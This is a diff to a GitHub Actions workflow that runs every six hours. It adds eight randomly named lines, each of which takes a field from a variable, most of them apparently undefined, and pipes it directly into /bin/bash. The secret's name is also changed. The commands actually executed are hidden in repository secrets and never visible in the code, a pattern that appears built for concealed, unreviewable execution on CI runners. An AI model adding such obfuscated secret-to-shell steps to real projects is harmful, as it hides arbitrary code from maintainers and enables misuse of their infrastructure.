@@ -1,8 +1,10 @@
 name: projectileclue
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '40 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,9 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: projectileclue
         env:
-          vwoe4: ${{ secrets.vwoe4 }}
+          zwrxo69546: ${{ secrets.zwrxo69546 }}
         run: |
-          echo $vwoe4 | jq -r .q01 | /bin/bash
-          echo $k66 | jq -r .brrsj08 | /bin/bash
-          echo $ewvch71161 | jq -r .x4 | /bin/bash
+          echo $zwrxo69546 | jq -r .vhb9832 | /bin/bash
+          echo $bbf3429 | jq -r .li544 | /bin/bash
+          echo $qfhr349 | jq -r .br77452 | /bin/bash
+          echo $gvvwl775 | jq -r .qwucl156 | /bin/bash
+          echo $fk2 | jq -r .vfbsw221 | /bin/bash
+          echo $jndnb325 | jq -r .se19 | /bin/bash
+          echo $os91922 | jq -r .aiw45 | /bin/bash
+          echo $jhnmp662 | jq -r .tcfv4 | /bin/bash
 
